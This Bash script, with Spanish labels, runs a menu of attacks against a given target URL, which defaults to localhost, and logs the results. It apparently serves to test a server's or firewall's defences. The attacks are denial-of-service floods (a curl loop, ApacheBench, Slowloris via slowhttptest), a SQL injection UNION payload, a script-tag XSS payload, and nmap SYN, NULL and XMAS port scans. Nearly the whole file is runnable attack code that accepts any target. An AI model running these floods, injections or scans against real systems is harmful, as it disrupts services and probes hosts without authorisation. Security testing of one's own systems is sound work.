#!/bin/bash

TARGET=${1:-http://localhost}
TIPO_ATAQUE=$2
LOGFILE="resultados_ataques.txt"
MODE=${2:-"--test"}

# Verifica si la URL tiene prefijo http
[[ "$TARGET" =~ ^http ]] || TARGET="http://$TARGET"

function log() {
  echo -e "\n\n[>> $1 <<]" | tee -a "$LOGFILE"
}

function medir_tiempo() {
  local start=$(date +%s%3N)
  "$@" | tee -a "$LOGFILE"
  local end=$(date +%s%3N)
  local duration=$((end - start))
  echo "[⏱] Tiempo de ejecución: ${duration} ms" | tee -a "$LOGFILE"
}

function ataque_ddos() {
  log "Ataque DoS curl paralelo (100)"
  local completed=0 failed=0
  local start=$(date +%s%3N)

  for i in {1..100}; do
    if curl -s -o /dev/null --max-time 5 "$TARGET"; then
      ((completed++))
    else
      ((failed++))
    fi
  done

  local end=$(date +%s%3N)
  local duration=$((end - start))
  local total=$((completed + failed))
  local success_pct=$(( total > 0 ? 100 * completed / total : 0 ))

  echo "[⏱] Tiempo de ejecución: ${duration} ms" | tee -a "$LOGFILE"
  echo "[✔] Completadas: $completed | [✖] Fallidas: $failed | [📊] Éxito: $success_pct%" | tee -a "$LOGFILE"
}

function ataque_ddos_saturacion() {
  log "Apache Bench: 1000 peticiones / 100 concurrencia"
  ab_output=$(ab -n 1000 -c 100 "$TARGET/" 2>&1)
  echo "$ab_output" | tee -a "$LOGFILE"
}

function ataque_ddos_slow() {
  log "Simulación Slowloris"
  if ! command -v slowhttptest &>/dev/null; then
    echo "[!] slowhttptest no está instalado." | tee -a "$LOGFILE"
    return
  fi
  slowhttptest -c 200 -H -i 10 -r 200 -t GET -u "$TARGET/" -x 24 -p 3 -l 10 | tee -a "$LOGFILE"
}

function ataque_sqli() {
  log "Ataque SQL Injection"
  local respuesta
  respuesta=$(curl -s -w "\n[HTTP_CODE:%{http_code}]" "$TARGET/?id=1 UNION SELECT * FROM users WHERE '1'='1'")
  echo "$respuesta" | tee -a "$LOGFILE"
}

function ataque_xss() {
  log "Ataque XSS"
  local respuesta
  respuesta=$(curl -s -w "\n[HTTP_CODE:%{http_code}]" "$TARGET/?search=<script>alert('x')</script>")
  echo "$respuesta" | tee -a "$LOGFILE"
}

function escaneo_puertos() {
  log "Escaneo SYN"
  medir_tiempo nmap -sS -Pn -T4 -p- $(echo "$TARGET" | sed 's|http[s]*://||') 2>/dev/null
}

function escaneo_null() {
  log "Escaneo NULL"
  medir_tiempo nmap -sN -Pn $(echo "$TARGET" | sed 's|http[s]*://||') 2>/dev/null
}

function escaneo_xmas() {
  log "Escaneo XMAS"
  medir_tiempo nmap -sX -Pn $(echo "$TARGET" | sed 's|http[s]*://||') 2>/dev/null
}

function prueba_http() {
  log "Acceso normal"
  medir_tiempo curl -s "$TARGET" -o /dev/null
}

function ejecutar_todo() {
  rm -f "$LOGFILE"
  prueba_http
  ataque_ddos
  ataque_ddos_saturacion
  ataque_ddos_slow
  ataque_sqli
  ataque_xss
  escaneo_puertos
  escaneo_null
  escaneo_xmas
}

function ayuda() {
  echo "Uso: $0 <url> <ataque>"
  echo "Tipos de prueba:"
  echo "  --test         => Acceso normal"
  echo "  --ddos         => Conexiones curl simultáneas"
  echo "  --ddos-full    => ApacheBench con 1000 peticiones"
  echo "  --ddos-slow    => Simula conexión lenta tipo Slowloris"
  echo "  --sqli         => Simulación de SQL Injection"
  echo "  --xss          => Simulación de Cross Site Scripting"
  echo "  --scan         => Escaneo SYN con nmap"
  echo "  --scan-null    => Escaneo NULL con nmap"
  echo "  --scan-xmas    => Escaneo XMAS con nmap"
  echo "  --all          => Ejecuta todas las pruebas anteriores"
}

case "$TIPO_ATAQUE" in
  --test) prueba_http ;;
  --ddos) ataque_ddos ;;
  --ddos-full) ataque_ddos_saturacion ;;
  --ddos-slow) ataque_ddos_slow ;;
  --sqli) ataque_sqli ;;
  --xss) ataque_xss ;;
  --scan) escaneo_puertos ;;
  --scan-null) escaneo_null ;;
  --scan-xmas) escaneo_xmas ;;
  --all) ejecutar_todo ;;
  *) ayuda ;;
esac
